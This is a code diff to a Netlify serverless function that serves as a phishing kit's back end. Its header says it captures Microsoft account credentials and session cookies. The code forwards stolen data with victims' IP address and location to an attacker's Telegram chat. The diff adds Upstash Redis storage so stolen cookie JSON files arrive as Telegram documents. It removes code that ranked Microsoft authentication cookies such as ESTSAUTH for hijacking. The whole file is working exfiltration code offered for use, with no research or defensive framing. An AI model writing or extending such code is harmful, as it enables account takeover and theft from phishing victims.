@@ -2,6 +2,7 @@
  * ENHANCED Telegram Bot Function for Netlify
  * Handles credential and cookie data transmission with IP detection and file export
  * Supports comprehensive Microsoft domain cookie capture with location data
+ * Uses Upstash Redis for file storage
  */
 
 const https = require('https');
@@ -9,6 +10,10 @@ const https = require('https');
 // ENHANCED: Telegram configuration with better error handling
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// UPSTASH Redis configuration
+const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
+const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
 // ENHANCED: Validation function
 function validateTelegramConfig() {
@@ -18,7 +23,115 @@ function validateTelegramConfig() {
   if (!TELEGRAM_CHAT_ID) {
     throw new Error('TELEGRAM_CHAT_ID environment variable is required');
   }
+  if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
+    throw new Error('UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN environment variables are required');
+  }
   return true;
+}
+
+// Redis helper function to store JSON file
+async function storeJsonInRedis(jsonContent, fileName) {
+  const key = `json_file_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+  
+  try {
+    const redisUrl = new URL(UPSTASH_REDIS_REST_URL);
+    const options = {
+      hostname: redisUrl.hostname,
+      port: 443,
+      path: '/set/' + key,
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${UPSTASH_REDIS_REST_TOKEN}`,
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(jsonContent)
+      }
+    };
+
+    return new Promise((resolve, reject) => {
+      const req = https.request(options, (res) => {
+        let data = '';
+        res.on('data', (chunk) => data += chunk);
+        res.on('end', () => {
+          try {
+            const response = JSON.parse(data);
+            if (res.statusCode === 200) {
+              console.log('✅ JSON stored in Redis with key:', key);
+              resolve({
+                key: key,
+                fileName: fileName,
+                size: Buffer.byteLength(jsonContent),
+                url: `${UPSTASH_REDIS_REST_URL}/get/${key}`
+              });
+            } else {
+              reject(new Error(`Redis error: ${response.error || 'Unknown error'}`));
+            }
+          } catch (parseError) {
+            reject(new Error('Invalid response from Redis'));
+          }
+        });
+      });
+
+      req.on('error', (error) => reject(error));
+      req.write(jsonContent);
+      req.end();
+    });
+  } catch (error) {
+    console.error('❌ Failed to store JSON in Redis:', error);
+    throw error;
+  }
+}
+
+// Helper function to send file from URL
+async function sendDocumentFromUrl(fileUrl, fileName, caption) {
+  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+
+  const postData = JSON.stringify({
+    chat_id: TELEGRAM_CHAT_ID,
+    document: fileUrl,
+    caption: caption || fileName,
+    parse_mode: 'HTML'
+  });
+
+  const options = {
+    hostname: 'api.telegram.org',
+    port: 443,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(postData)
+    },
+    timeout: 15000
+  };
+
+  return new Promise((resolve, reject) => {
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => data += chunk);
+      res.on('end', () => {
+        try {
+          const response = JSON.parse(data);
+          if (res.statusCode === 200 && response.ok) {
+            console.log('✅ JSON document sent to Telegram successfully');
+            resolve(response);
+          } else {
+            console.error('❌ Telegram API error:', response);
+            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
+          }
+        } catch (parseError) {
+          reject(new Error('Invalid response from Telegram API'));
+        }
+      });
+    });
+
+    req.on('error', (error) => reject(error));
+    req.on('timeout', () => {
+      req.destroy();
+      reject(new Error('Request timeout'));
+    });
+    req.write(postData);
+    req.end();
+  });
 }
 
 // ENHANCED: Message formatting with location data and file information
@@ -77,7 +190,7 @@ function formatTelegramMessage(data) {
     message += `<b>📍 IP Address:</b> <code>${escapeHtml(locationData.ip)}</code>\n`;
     message += `<b>🏙️ City:</b> ${escapeHtml(locationData.city)}\n`;
     message += `<b>🗺️ Region:</b> ${escapeHtml(locationData.region)}\n`;
-    message += `<b>🌎 Country:</b> ${escapeHtml(locationData.country)} (${escapeHtml(locationData.countryCode)})\n`;
+    message += `<b>🌎 Country:</b> ${escapeHtml(locationData.country)} ${escapeHtml(locationData.countryCode)}\n`;
     if (locationData.timezone) {
       message += `<b>⏰ Timezone:</b> ${escapeHtml(locationData.timezone)}\n`;
     }
@@ -169,122 +282,13 @@ function formatTelegramMessage(data) {
     }
   }
   
-  // Timestamp and session
+  // Timestamp and session (WITHOUT URL)
   message += `\n<b>⏰ Timestamp:</b> <code>${escapeHtml(timestamp || new Date().toISOString())}</code>\n`;
   if (sessionId) {
     message += `<b>🔗 Session ID:</b> <code>${escapeHtml(sessionId)}</code>\n`;
   }
-  if (url) {
-    message += `<b>🔗 URL:</b> ${escapeHtml(url)}\n`;
-  }
   
   return message;
-}
-
-// ENHANCED: Cookie file content formatting for Telegram
-function formatCookieFileContent(cookieFiles) {
-  if (!cookieFiles || (!cookieFiles.txtFile && !cookieFiles.jsonFile)) {
-    return null;
-  }
-  
-  let fileMessages = [];
-  
-  if (cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
-      const jsonMessage = `<b>📄 ${cookieFiles.jsonFile.name}</b>\n` +
-                          '<pre><code>' +
-                          cookieFiles.jsonFile.content +
-                          '</code></pre>';
-      fileMessages.push(jsonMessage);
-  }
-  
-  return fileMessages;
-}
-
-// ENHANCED: Cookie details formatting with better organization
-function formatCookieDetails(cookies) {
-  if (!cookies || cookies.length === 0) {
-    return 'No cookies captured';
-  }
-  
-  // Helper function to escape HTML special characters
-  const escapeHtml = (text) => {
-    if (!text) return '';
-    return String(text)
-      .replace(/&/g, '&amp;')
-      .replace(/</g, '&lt;')
-      .replace(/>/g, '&gt;')
-      .replace(/"/g, '&quot;')
-      .replace(/'/g, '&#39;');
-  };
-  
-  let cookieMessage = `<b>🍪 Detailed Cookie Analysis (${cookies.length} total):</b>\n\n`;
-  
-  // Group cookies by importance
-  const authCookies = [];
-  const sessionCookies = [];
-  const trackingCookies = [];
-  const otherCookies = [];
-  
-  cookies.forEach(cookie => {
-    if (!cookie.name) return;
-    
-    const name = cookie.name.toLowerCase();
-    if (name.includes('estsauth') || 
-        name.includes('signinstatecookie') ||
-        name.includes('estsauthpersistent') ||
-        name.includes('estsauthlight') ||
-        name.includes('buid') ||
-        name.includes('esctx')) {
-      authCookies.push(cookie);
-    } else if (name.includes('session') || 
-               name.includes('sess') ||
-               name.includes('sid')) {
-      sessionCookies.push(cookie);
-    } else if (name.includes('track') ||
-               name.includes('analytics') ||
-               name.includes('_ga') ||
-               name.includes('_gid')) {
-      trackingCookies.push(cookie);
-    } else {
-      otherCookies.push(cookie);
-    }
-  });
-  
-  // Format auth cookies (most important)
-  if (authCookies.length > 0) {
-    cookieMessage += '<b>🎯 Authentication Cookies:</b>\n';
-    authCookies.forEach((cookie, index) => {
-      cookieMessage += `${index + 1}. <code>${escapeHtml(cookie.name)}</code>\n`;
-      cookieMessage += `   Value: <code>${escapeHtml(cookie.value ? cookie.value.substring(0, 60) + '...' : 'empty')}</code>\n`;
-      if (cookie.domain) cookieMessage += `   Domain: ${escapeHtml(cookie.domain)}\n`;
-      if (cookie.secure) cookieMessage += `   Secure: Yes\n`;
-      if (cookie.expires) cookieMessage += `   Expires: ${new Date(cookie.expires).toUTCString()}\n`;
-      cookieMessage += '\n';
-    });
-  }
-  
-  // Format session cookies
-  if (sessionCookies.length > 0) {
-    cookieMessage += '<b>🔗 Session Cookies:</b>\n';
-    sessionCookies.slice(0, 5).forEach((cookie, index) => {
-      const cookieValue = cookie.value ? cookie.value.substring(0, 40) + '...' : 'empty';
-      cookieMessage += `${index + 1}. <code>${escapeHtml(cookie.name)}</code>: <code>${escapeHtml(cookieValue)}</code>\n`;
-    });
-    if (sessionCookies.length > 5) {
-      cookieMessage += `... and ${sessionCookies.length - 5} more session cookies\n`;
-    }
-    cookieMessage += '\n';
-  }
-  
-  // Format other cookies (summary only)
-  if (trackingCookies.length > 0) {
-    cookieMessage += `<b>📊 Tracking Cookies:</b> ${trackingCookies.length} found\n`;
-  }
-  if (otherCookies.length > 0) {
-    cookieMessage += `<b>📋 Other Cookies:</b> ${otherCookies.length} additional cookies\n`;
-  }
-  
-  return cookieMessage;
 }
 
 // ENHANCED: Telegram API call with better error handling and retry logic
@@ -323,7 +327,7 @@ async function sendToTelegram(message, retryCount = 0) {
                 'Content-Type': 'application/json',
                 'Content-Length': Buffer.byteLength(postData)
               },
-              timeout: 15000 // 15 second timeout for enhanced data
+              timeout: 15000
             };
 
             await new Promise((resolveRequest, rejectRequest) => {
@@ -457,18 +461,28 @@ exports.handler = async (event, context) => {
     const mainMessage = formatTelegramMessage(requestData);
     await sendToTelegram(mainMessage);
 
-    // ENHANCED: Send cookie file content as separate message if available
-    const fileMessages = formatCookieFileContent(requestData.cookieFiles);
-    if (fileMessages) {
-        for (const fileMessage of fileMessages) {
-            try {
-                if (fileMessage) {
-                    await sendToTelegram(fileMessage);
-                    console.log('✅ Cookie file content sent successfully');
-                }
-            } catch (fileError) {
-                console.warn('⚠️ Failed to send cookie file content:', fileError.message);
-            }
+    // ENHANCED: Send cookie file as Telegram document if available
+    if (requestData.cookieFiles && requestData.cookieFiles.jsonFile && requestData.cookieFiles.jsonFile.content) {
+        try {
+            console.log('📤 Preparing to send JSON file to Telegram...');
+            
+            // Store JSON in Redis
+            const redisData = await storeJsonInRedis(
+                requestData.cookieFiles.jsonFile.content,
+                requestData.cookieFiles.jsonFile.name
+            );
+            
+            // Send document from Redis URL
+            await sendDocumentFromUrl(
+                redisData.url,
+                redisData.fileName,
+                `<b>📄 ${redisData.fileName}</b>\n<b>Size:</b> ${Math.round(redisData.size / 1024)}KB\n\n<i>Cookie export from ${new Date().toISOString()}</i>`
+            );
+            
+            console.log('✅ JSON file sent to Telegram successfully');
+        } catch (fileError) {
+            console.warn('⚠️ Failed to send JSON file:', fileError.message);
+            // Continue even if file sending fails
         }
     }
 
